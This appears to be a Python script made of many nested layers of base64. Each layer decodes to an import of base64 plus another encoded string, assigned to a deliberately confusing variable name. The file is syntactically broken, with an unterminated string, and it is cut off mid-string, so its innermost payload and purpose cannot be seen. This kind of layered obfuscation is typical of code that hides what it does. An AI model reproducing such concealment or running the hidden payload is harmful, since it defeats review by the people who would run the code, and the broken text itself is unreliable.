import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3lSbGhOV0dScFRUQnZkMU5WWXpWa01YQllUbGQ0YW1KclJreFhiVFZMWkcxS1ZGRnVXbXBTTVZveFYyeG9TMlF3YkVoaVNGSnFVbnBzTlZwRlRrTmlNbEpKVlc1a1JHSldjRFZaYWtsM1dqSkplbEZ0ZUdsaVZsbzFXVEJOTVdJeVVrbFZibVJLVWpKNE1Ga3dZelZsVjFKRVVXNXNZVmRGV1hoWGJHaFBUVVY0UkZGdWNHRlhSWEIzVjFaa05HTkhWblJXYlZwaFYwZG9jVmRzYUVOTlIwWllUMWhXU2xJd1dqWlRWVmsxWld4d1dWTnVRbHBXTTJoM1dsY3hWMXBzY0ZsaFIzQmhWMFZKZDFsV1l6VmtWWGhFVVcxd2FVMXFWWGRYYkdNeFRVWm5lVlZ1UW1wTk1Fb3lXWHBLYzAxSFJsaFBXRlpFWWxad05WbHFTWGRhTWtsNlVXMTRhV0pXV2pWWk1FMHhZa2RXU0ZSdGVHcFRSa3AzV1dwSk1XVnJiRWhpU0ZKcVVucHNOVnBGVGtOUmJHdDVWRzE0YWswd05VZFpNalZMWkcxT2JtTklRbWxYUlVveVdUSTFVbG95VVhsV2JteG9UVE5DYzFwR1pHcFRNa1pZVFZoa2FVMHdiM2RUVldNMVpXdE9kRmR1YkdsTmFrSnVXV3BPUTJKSFNuUldibXhxVVhwV2IxZHJaRk5rYlVwMVZGaFdhazFyV25GWk1qRkhXbXh3U0ZadVVtbGxWRll3V1dwS1UySkhTa2xVVjJSb1ZucEdNMWxxVGt0TlJXeElWRzVhYVZkR1dqRlhiR2hPVXpCT2RGUnVUbHBYUlRVMlUxVlZlR0pIU25WVWJXaG9ZbFphUTFwSE1YTmxiVW8xWVVjNWExTkdTak5VUjNSUFpHMUtkVlZ1YkdsTmJtaDZWMnhvU21ORk9XNWlNSFJLVVRCR2JsTlZWa05pTWxKSlZXNWtUV0pyY0RKYVJtaFRZa1YwUkZreldtdE5iRnB3VkVSSk1XSkhVWGhQV0U1b1ZqQTFjMWx0TVU5alJteFVXVE5PU2xOR1NURlpNR1JXVDFWdmVXRkVRbXRUUlVaMVZFVk9RMkZIVWxsVmJUbFJWVEJ3TVZscVNURmlSV3h3WlVkd2FrMHdjSFJWUmxaaFlVZEtTVlJ0ZUV4VlZ6bHVVMVZPUWxveGNFaFdiVEZLVW5wV2MxcEVSVFZqTWtaWVZHMTRhV0pWTlhkWFZrNXZaV3h3V0dWSE1VMVJNRW8xVjJ4a1UyTkhUblJXYlhCclVrUkdVRmxxU1RGaVJYaEVVVmhHVEdKWVVYcFRNVkoyVXpCc1JGRlhaRXBSTUVadVUxVk9RMkV4Y0ZoTldGcEtVa1JDYmxreU1WZGxSMUpZVm01d2ExRjZWbk5aYlRWaFdXdHZlbFJxUWxwWFJXOTNWMFJLVTJKSFNsaFBSelZaVlhwV05scEdaRk5rYTNSRVlUTldhazFzV205Wk1qRlBZakIwUjJSSFVrMVJNRXA2V1ZaamVHTkhVa1ZOU0doTVZWYzVibE5WVGtKYU1HeEVVVmRrU2xJeWVIUlRWV014WkcxU1JGRnRkR0ZXZWtZeVZFY3hUMlJzY0VoaVJ6VnBUVlJzY2xkc2FFOWhWMHBJVDFob2ExWXhXakpVTW1SMldqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJibXhoVjBWWmVGZHNhRTlOUlhoMFZtNVdhMkpJVG5WWmVrNVRZVWRPZFZWdFdtRlNNVm93V1c1c2ExcEZlSFZVYWtaaFVucG9kbE14VFRGa1ZuQlpXa2RhYVZJeWVIRlhiR014WVcxR1dGSlhPVXhWVnpsdVUxVk9RbG93YkVSUlYyUktVMFZ3YzFwRmFGZGxWMHB3VVc1d1lWWXphSFJVUnpWcllrWnNjMDlZVG1oV01EVnpXVzB4VDJOR2JGUmFNMEpFV2pJNWJsTlZUa0phTVVaSVlVUkNhMU5GUmpGWk1qQTFUVmRTU0ZaWE9VdGxWR3Q2VjJ4a1NtUnRTa2hpUjNCaFZucFdjVmxXWkVaaWEzaEVVV3BDYkZkRlNuTlZSazVyWWpKU1NWVnVaRXRsV0dSdVYxWm9WMDFIUmtWTlIyeHBZbFJzTVZkc1RrcGpNV3Q2Vkc1c1lXRnFSa2hYVm1RMFpXeHdWR0V3ZEVwUk1FWnVVMVZrVTJKR2NIQlJhazVoVmpCd2JWbHJaSE5oYkhCWVRsZHdhRll3Vm5aWmVrcFhZekZ3Y0dReVpHcGlWbHB5V1Zab1MySkdhM3BWVkd4VllsUnNNVmRzVGpOYU1IUndZMGhLYTJWWGN6SlJNbXhDV2pCc1JGRlhaRXBSTUVadVYydGtWMlJIU2pWUlZHeEtVMFZ3YzFreGFGZGlSMDE2VlZoV1lWWjZWWGxXTTJ4clpXMVNTRkp1Ykd0U2FteHlWMnhqZUdScmIzaE5TRlpxVFRGYWNsbHViRzVqUlhoMVZHMTRXbGRGY0hGWlZVNXZXV3hvVkdReVpHbFNNbmd3V1Zab1VrOVZNVlJoTUhSS1VUQkdibE5WVGtKYU1HeEVVVzVzWVZkRk5IaFphMmhTV2pGQ1ZGRlhiRXBoVldzMFdWVm9VMlJIU2tWT1JYUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSV1ZIT1dGV01GcHlWVWRrZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUldWSVVtRlhSa3B2VTFWa1QyUnRTblZWYlhocFlteEZOVk5YZEhOU2JFSllWbTEwWVUxc1ZucFhWRXB2WlZkSmVVMVhlRkZXUlZad1UxVmtiMDFIVWtsUldGSmhWMFZaZUZsV2FGcFBWV3h6V2pOU1YxWlZWakJWVkVrMVpFZE9TRkpxUW1oV01IQjZWMnhPU2tzd1RuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpGRlNla1p6V2tWa1Jsb3hhM2xQV0ZaclVqRmFNVnBGVVhkaFYxSklWbXBTYTFGNmJIWmFSV040WXpBNU5WRnRjR2hTTUZvMVdYcEtWMDFHUWxsV2FrSmhZVlJCTUZOWGJFTmlNbEpKVlc1a1RWWXhXalJhUm1SelRXeENWRk50Y0dsTmFsVjNWMnhqTVUxRmVGbFZhbFpxVWpGV2NGVkhaSFphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVZsUkVKb1YwWktlbGRzVVRGV1JrWldWR3hPVWxaVVJrZFdSM2hUVm14U1ZXUXpXbXRTTW5kM1dXdGtWa3N3VG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkZGU00yaDNXVzB4ZWxveVJrbFRiWGhoWVdwQ2NGUkVUbE5pTVhCWVRWZDRXVTB3Tlc5WFZFNUxZVWRLV0ZadVZtdFRSbG93VkVST1QwMUdiRmxWYmtKYVpWUnNObGt5TVU1a2JVWllUVmMxVFUxc2NHOWFSekZ6WVcxSmVVNUlWbXBTZWxaMVUxZHNRMlZXY0Zoa2VteEtZbXMxZGxscVRrdE5SbXQ2Vm1wQ1NsSXllSEZaYWtrd1lWWkNibUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEpJYUhwWlZtTXhZMnRzU0dGSWJHRldNV3MxVTFkck5VMHhjRmhUV0ZwcVRURktiMXBGWkhOaGEzZDZWRzVzV21WVWJIRlplazVPWkd4d2RWWnVUbWxSZWxaeFdYcE9UbUZWYkVsVGJYaHBVa1JDY0ZsNlRsTk9WMHBJVm01d2FGSXhXbk5hUlU1S1N6Qk9jRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtVVkl6YUhkWmJURjZXakpHU1ZOdGVHRmhha0p3VkVST2EySkdiSEJQV0hCclVqQlpkMWxXWkU1a2JVcElZa2RzVFUxcmNESlphazVUWlcxU1NWTnRhR3BSZW14eFdYcE9UbVJzYkhSUFdGcHJVMFUwZDFreU1VZGtNSGgwVkc1d2FtVlZiRzVaTWpGWFl6RkNWRk51Y0d0VFIzaDZWMnhvVDJJeGNGaFdha0pLWVdwU1RGTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1FrOUhTa2hpU0Zab1pWVktkbGt5TVZkaVZrSlVVMWhhYTAxc1duQlVSRTVQVFVac1dWVnVRbHBsVkd4NldWWmtTbVJzY0hSUFdGWnJVakJaZWxkc2FFOWtiVXBZVmxoYVdrMHdOVFpVUkVwaFpHMUtkVlZZVWxwWFIxSnpXWHBKTldSR2NGUk9WM0JxVFRBeGNGTlZhRXRpUjBwRlRVZHNhazB4U1RGWmEyUlhaVzFHU0ZadGVHdFJNR3R5VVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGQ1NWUnRjR3BpVjNneldrVk9RMlZ0VG5SVVZHeEtZVlJyZWxkc1pFcGtiVTE2Vlcxb2ExSXllSEZVUkVvMFkwWnNjRTlZUm1wWFJscHpXVEkxY21SdFJuVlNha1poVjBWdk1WUkhNWGRsYTJ4d1VXcENiRmRGU25OVlJrNUxUVVp3V1dGRVFrMU5ia0p2V2tjeFIyVnNhM3BUYmtKcVUwWkdjRlZIY0ROa2JVMTVWRzVzYUZkRlNYZFZSMlIyV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxWRlRUVmlNWEJZVW0xMFVWb3lPVzVUVlU1Q1dqQnNSRkZYWkVwU1NHaHdXV3BLVTA1VmJFaFViazVhVjBVMU5sVkdUa3RoYlVsNVRsUkNXbFl5ZURGWGJHaEtZVlpDY1dWSGRHaFhSbXh1VjFSS05HRkhUWHBVVkd4S1ltdHdNbHBJYkVwTE1FNXdVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RazlHY0VoaVJFcEtVakExZWxkV2FFOWxiRUpVVTJwQ1lWZEhaM2RVUm1SUFlrZEtkVlZ0ZUdwaFZXdHlVVEpzUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGVWFHaFdla1oxVTFWb1QyVldiRFpOUjJ4TlRURktkbGRzWTNoaVJtZDZWRzFvV2swd2NHOVpiR1JYWkZkU1NWWnVVazFOTURSM1YxWm9VMk5HYkRWUFdIQnFZbFV4TWxsV1kzaGlhM2Q1WlVoYVlVMXFhREZaTUdNeFltdHNjVTVGZEVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RlpETmFZVkl5ZDNsVlIyUjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibFZGWkZOalIxSndVVzF3YVZJd1dqWlpNMjkzWVZkU1NGWnFVbXRSZWtaeFYyeGpNVTFHY0ZsVFYyeFJXakk1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZTTkdJd01YRk9WWEJwWWxad01sa3lNSGhoUm10NVltdFNlazFxVW01WGEyUldXakpLU0ZKWFpHbFNNbmh4VjJ4ak1XRnRSbGhTVjJSaFVqRldibHBHYUU5a2EyeElWVzE0U2xKck5VTlZWRVpMVVd4U1ZsWnJPVmRTYkZwUFZVVk5OV0l3TVhGT1JHaGFZbXRzTWxWSFpIWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZVYUd0U01GcHdXV3RrVmtzeFFrbFZibXhSV2pJNWJsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWU05FMUdjRVZPUkdoaFlsUnNNVnBGVGtOaGJVbDVaVWhhYW1GcVFuQmFSRXB2WTBkU1NGWlhiRkZoVkZJeFZFZHJNR1JWZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGVjRjRTVJVmsxaFZGSXhWVVZOTldKWFNYbE9WRUpSWVc1a01scEZaRkpMTUU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSUlUwWktjbFZIY0RSaVYwbDVUbFJDU2xJd05USlphMk0xWlZaQ1ZGTnFUbWhTTW5kM1YyeE9Ta3N3ZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGVjRjRTVJVmsxaFZGSXhWRWRyTUdSVmVIQk9SR2hOVFd4d01sbHROVkpMTVVKRVQxUkNZVkpFVWt4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKUFIxSklWVk4wVVZJeGNESlpiVFZTV2pGcmVVOVlUbWxOTUdzMVUxYzFhMkl5UmxsVmJYaEtZV3BTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGVjRjRTVJVmsxaFZGSXhWRWRyTUdSVmVIQk9TRlpOWVZSU01WUkhjRE5rYkhCMFQxaFdhMUpFVVRSVVJFNVRZVEZDYm1JeVpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xKSVozZFhhMUV3VXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZSb2FGSkdSWEpWVkdoUVpXeHdTR0pITldsbFZVcHlWMnhPUTJWdFNYbGxTRUphVFcxM2QxcEdaRkpPYkVKSVYyNWFhV0pzUm01WFZFazFZekpKZWxOVWJFcGlWWEI2V2taa1ZtRldRbkJSVjNocVpXNWtNbGR0TURWa1YxSkZUa1JvVFUxdFkzZFZSMlIyV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hGWlVjNVQxSkVWa1ZrZW1SUFlUSkdXRnBJV2twU01VcHpVMVZrVTJKSFRYbFRiazVwVFRCWmVGZHNZelJPYkVKSVYyNWFhV0pzUm01WFZFazFZekpKZWxOVWJFcGlWWEI2V2taa1ZtRldRbkJSVjNocVpXNWtNbGR0TURWa1YxSkZUa1JvWVdKVWJERmFSVTVEWVcxSmVXVklXbXBoYWtKd1dUSXhWMkV3YkhGT1IyUkxWMFV3TkZSRVNtRmtiVXAxVlZOMFVWRjZiSFpVYTFFd1V6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWUm9XbUpyYkRKVlIzQTBZVmRPY0U5RGRFUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JXVkhPVTlTUkZFMFYxZHZNVkpXYkZsVmJscHFaVlZLY2xkc1RrTmhiVWw1VGxSQ1dsWXdOSGRaYm5CMlQwVjNlVk5UZEZGUmVteDJWR3RSTUZNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VlVWa2JrMUdRbkZsU0U1b1ZrUldSVmxxVGt0bFZuQllUMGRrWVZZemFITlhWRTVUWlZoak0xUnVWbWhXTURVeVZESnNRMDVIVmtsaFJGSnNVMGRuTUZWVmFHOU9SMVpKWVVSU2JGTkhaekJhVlUweFRrZFdTVm96Vm14VFIyTTBWRVJLTkdOR1FuRmtNMXBvVWtaRmNsRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VraG9kbFJyVVRCUFIwcElZWGwwVjFJeFducGtlbHB6WWxkSmVVNVlXbEJoVlVaMlV6TndWbVZyZEZSUlZFWk9ZV3RzTkZSWWNHcE5WVFZFVWtWU2VtVlZSblpUTTNCV1pXdDBWRkZVUmxCU1IyUTBWR3hTVm1Rd09VVmtNMXBwVWpKemNsVkZUVFZpTURWRlRrVjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RazlGZDNwVmJYUlJZVzVrTWxwRmFFcExNVUpFVDFSQ1dsWXdjSHBYYkZFd1V6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZVak5rYkhCSVlrUktVVm95T1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSUlVqRktkMXBIYkVOaGJVcElVbTV3YW1WcVFuQmFSV1JYVGtkU1JFMVhjR0ZXZWxWM1YyeG9TbUZXUW01aU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwU1NHaHZVMVZrYjJWV2NGaFhWR3hLWVZaYU5sTlhiekZXTWtsNVpVUktZVmRGYkc1WFZtUXpXakpHV0U1WVFscE5iWGd5VTFWa1UySkZiRWxVYlhocVRXMDFSV042U1RCUFJYZDVVbE4wU2xOSVpHNVJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNVUpJVWxka2FGTkZjSE5YYlc5M1lWVndXVlJYYkZGaGVsVjRWMnhvWVdGRmJFaGxTRUphVFd4YU1WZFVTbk5oUmtKRVQxZG9VVm95T1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSUlVYcHNjbGxXYUZwTE1FNXdVVmRrU2xFd1JtNVRWVTVDV2pGQ1JFOVhkR2hYUm10eVZVVk5OV0ZYU1hsVmFsWlJZVzVrTWxsVmFGTmtSMHBGVGtkc1NtRlZiRzVUYkU1Q1lqQk9jRkZYWkVwUk1FWnVVMVZPUWxveGNFaFdibEpwWlZSV2NWbHFTbE5qUm05NVQxZGFZVlo2VlhkWk1qRkhZVEZzVkU1WGVHbGlWVFV5VjJ0a1ZtSXdkRlJSYmtKaFlWVktjbGRzWTNoa2EzaDBWbXBTYUZkRk5IZFpNMnh1WTBWc1NGWnVUbXBOYkZadVUxZDRTMkpHYjNsaVNIQnJVMFZ3TWxOVll6RmthMnhJVm01V1drMXFiREZhUldoTFlVWndTRTlIYkUxUlZ6bHVVMVZPUWxvd2JFUlJWMlJLVWpGS2MxbHNZelJrVm10NVQxZDBhRll5VWpKWFJFcFRZa2ROZVZOdVRtbE5NRmw0VjJ4ak5HUldjRmhPVjNCcFRXeEtjMU13VG5KYU1rWllWMWRrWVZJeFdqQlpibXN4WWtkV1NHSkljR3RUUlRGMlV6Rk9RMkZIU25SVlYyUmhVakZhTUZsdWF6RmhiVWw1Vlc1Q1lVMXFiRzFYYTJSWFpXeHNkR1ZJV21wWFJscHpXVzVzUTJKSFNrbFViWGhLVVRCc2NGUkZSblphTUd4RVVWZGtTbEV3Um01VFZVNUtXakJzY0ZGdVFtRmhWVXB5VjJ4amVHUnJlSFJXYWxKb1YwVTBkMWt6Ykc1alJXeElVbTVXWVZFd1NuSlhiR040Wkd0NGRGUnVXbUZTTW5oMVdXcEZOV0V4Y0ZsVWJXeHBVbnBzTkZwR1pGZGthMnhJVm01T2FrMXNWbTVUVjNNeFZVVnNSMU5yV2xOTlIzaFZWbXRhUzFGc1NrWlBSMmhLVlRCV2NGUkZSblphTUd4RVVWZGtTbEV3Um01VFZXaHJZa2RPZEdSRVdtRlhSbHAxVkVjMVYyVlhTa2RQV0doclZucHJkMWRzV1RWa01rcEpWbTV3VEZFd2NIcFpha3ByWTBkS2NGTllRazFUUjFKeldUSXhNRTVzY0ZsV2JUVk5ZbXhhTlZscldUVmxSMUpZVDFSQ1lWWnFiRE5aYTJoWFpXdDBSRk51Vm1GWFIxSnRXV3RrYzJGc2NGaE9WM0JvVmpCV2NGTXhUbkpUTUd4RVVWZGtTbEV3Um01VFZVNURaVlp3V1ZWcVJtcGlWRkp1V1RJeFYyVnRVbGhsUkVKRVdqSTVibE5WVGtKYU1VWklZVVJDYTFORlJqRlpNakExVFZkU1NGWlhPVXRsVkd0NlYyeGtTbVJzYkZsWGJrSnFUV3BvZFZSRlRrTk5SMVpaVVcxNFVWVXlVblphUldoVFpEQndOV1F5WkZwWFJsbDNXVlZSZDJGWFNuUlBXRlpoVlRCc2VsZFVUazlsVm5CeFRWVmtXbFl6YURaWGJFNXlVekJzUkZGWFpFcFNNVXB6VjIxc1EwMHhjRmhUYlZwYVYwWndkMWw2U1RSaU1rMTVWbTVPWVdGWVpHNVpNakZYWVRKR1dWTnRlRnBOTVVVMVZrY3dOV1JXY0ZSa01tUk1ZVmhDZVZwSWJISk9hMDV3VVZka1NsRXdSbTVUVlU1Q1dqRndTRlp1VW1sbFZVVTFVMVZvUzJKSFRsbFdiWGhxVFRGR01WZHNZekZOYkdRMVdraHdhMUl3V2pWYVJWazFZVEZ3V0UxWVdrdE5WRUl4V1hwT1YyRXlTalZhTTBKTlltczFjMWRXYUV0aGJVWkVZVWRLV1ZVelpHNVphMlJ6WkVkR1dWVlViRTVWTW5STVUxVk9RbG93YkVSUlYyUktVVEJLTlZkc2FFOU5WMHBKVlZka1VWVXdSbkJUVjJ4S1QwZEdTVlZ1VW1sU1JGSk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEpJYUhaWGJHUkhZVEZDYm1JeVpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xKSWFEQlhiR2hUWVVWc1NGUnVXbWxpYkVweldXMDFVazlWYkhKaVJWcFJWakZhY2xkcVNsWmpNV3Q1WVVoc2FVMXFSbk5WUmxKR1lWVnNTR0ZFUW10VFJVWXdWMnhvUjAxWFJsbFhWR3hLWWtka01GWnNWa1prUmtWNVQxaFNhbEl3V1hkWlZtUkxZekZ3VkZOVGRFUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVZSV040WWtkU1NGSlhaRnBOYW13eFdrVmtWMlJYVWtWTlIyeHJVakZaTUZwRlRUVmlNbEpJVFZoT1VHVlZTbkZaVldSSFpWZE5lVlpxUWxGWFJsbDNWMjFyZDA1RmJIQlJiVGxyVTBaS00xUkdaRmRsUjFKWVlrUktVVlV3Y0hGWmFra3hUVVp3V0U1VVFrMVhSa2t4V1RCa1ZtRldRbTVpTW1SS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBTU0dkM1dWWm9VMk14Y0ZWT1ZsSlNWbFUxVkZWV1ZYaFNiRkp6Vld4YVZWWklaREphUldSelRVZEtTRlpUZEVSaFZVWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VlJXUTBZMGRLZEdNeVpHaFRSWEJ6VjIxdmQyRlZkM3BWYlRsaFZucEdjMWRFVGs5aFJtdDZVMjFvYVZZeFdqRmFSV2hYWkVWM2VsUnFRbHBYUmtwM1YxaHJOV1Z0VG5SVVdGcG9WbnBHZFZSRVNtRmhSMUowWWtkd2FVMXFVakZaTUdNeFltdHNjRkZ1YkdGV00yTTFVMWMxVDJJeVNYcFRha0phVFRGWmQxTlZaSE5oYlVsNVRrZHNVVm95T1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVWpSak1rWllUbGhLU2xJeWFEVlhiR1JhVDFWc2NFOVVUbUZXTUd3eVdYcE9VMkZIVWtoaVIzQk5UVEExTlZkWWF6VmhiVTE2VkZoYVlXSnNXbnBaYTAweFlXMU5lbFJYYkVwVFJYQnpXV3RSZDJGWFRYcFZhbFpwVWpGYU5sbFZaRmRpUjFKRVUxTjBSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibFZGWkRSalIwcDBZekprYUZORmNITlhiVzkzWVZWM2VscEhlRnBoVkd3MldrVmtSMDFIUmxoVVdGcHBVako0Y0ZSRVNrdGtiVWw2Vlc1d2ExTkZjRzlaTUUwMVlXMU5lbFJZV2xwaVZHd3lXa1ZvVDAxSFRuUlNibVJOWWxVMU5sa3piRXBhTWs1MFZtNU9VVlV3Y0RaYVJXaHpZekZ3V1ZSdE9XRldNVmwzVTFkdk1GTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlVhR2xTTW5neFdWaHNRMkl5VG5SV2JURlJWVEJzTWxwRVNsZGhWWGQ2VkdwQ1dsZEdTbmRYV0dzMVl6SkdXRk5ZV21GaVZHd3hXa1ZrUjAweGNGbFVibHBwVmpGV01sZFVUazlsYTNkNVYyNWFhV0pzUmpCWFZtaHJZa2ROZVU5WVVtRlZlbFp4V1hwT1RtRlZiRWxUYlhocFVrUkNjRmw2VGxOT1YwcElWbTV3YUZJeFduTmFSVTVLU3pCT2NGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1VWTkZOWEZaTWpGelpESlNSRkZ1Y0dwaVZUQTFVMWRyTlUweGNGaFRXRnBxVFRGS2IxcEZaSE5oYTNkNVpVaENXbUZVYkhoWk1XaFhZa2RPZFdFeldtaGlhMWw0VjJ4b1MwNVZlSFJqU0hCS1lWVkpkMXBXYUVOaVJrSlVVMnBDWVZkSFozZFVSRXAzWVVkU2RGSnVjRnBOTUhCM1dUQm9VbUZXUW5Ga00xcHFUV3MxTlZsV2FFTk5Sa0p1WWpKa1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxveFFrUlBWemxoVmpCYWNsVkhaSFphTUd4RVVWZGtTbEV3Um01VFZWSTBZVmRKZVZWcVZrcFNNRFY2VjFab1QyVnNRbFJUYlhCcFRXcFZkMWRXWkhOa1ZuQlpVMWRzVVdGdWFISlpWbWhhV2pGcmVXVkhhR3BOTURBMVUxYzFTMlJ0VWpWVFUzUkVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZVYUdGU01uZDVVMVZrVDJNeGJGbFVibkJSVlRCdmQxZHNhRzlOUlhoWVZHMTRhV0pzU25OWk1teEtTekJPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JUUlpWbU40WW10c1NWUnViRnBsYWtKd1ZFUk9VMkl4Y0ZoTlYzaFpUVEExYjFkVVRrdGhSMHBZVm01V2ExTkdXakJVUkU1UFRVWnNXVlZ1UWxwbFZHdzJXVEl4VG1SdFJsaE5WelZOVFc1b01sZHFTVFJrVjA1SVRsYzFTbUZxVWt4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VraGtNbGRyWkhOTmJFSnVZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG94UWtoVmJrSnJZVlZLY1ZsclpFZGxiVTQyVFVkc2ExSXhXVEJhUlUxNFlXeHdXRTVVUW1GWFJXeHdWVWRrZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUldWSE9VNWhhbFpWV1dwS05HTkdhM2xpUkVKaFZUQktObHBHVGtOak1rWllWRzE0YVdKVk5YZFhWazVEWVRGd1ZGRnFSbXBOYW1jMFZFUktibVZXUW5GbFIyeHFZVlJuY2xFeWJFSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSV1ZFUWxwV01IQjZWMnhSTUU5SFVrbFRVM1JFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VlVWb1UyRXhRbkZsUnpGcFRXcFZkMU5WWkU5a2JVcElUMWhzVVZVd2IzcFpWV1J6VFVad1ZGTlRkRTFoVkZJeFZFZHJNR1JWZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGVjRjRTVJVmsxaFZGRTBWRVJLWVdSdFNuVlZVM1JSVVhwcmQxZHJVVEJUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVkdoclVqRkZjbFZGWkdGa2JVcDFWVmRrV2sxcWJIcFphazVLVDFWc2RWcEhPV2hYUmtwelUxZHZNR1JWZUhCT1NGWk5ZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVakZVUjJzd1pGVjRjRTVJVmsxaFZGSXhWRWRyTUdSVmVIRmtNMXBoWWxSc01WcEZVVEJQUlhkNlZXMTBVVm95T1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVWpSTlJuQkZUa1JvWVdKVWJERmFSVTVEWVcxSmVXVklXbXBoYWtKd1drUktiMk5IVWtoV1YyeFJZVlJTTVZSSGF6QmtWWGh3VGtoV1RXRlVVak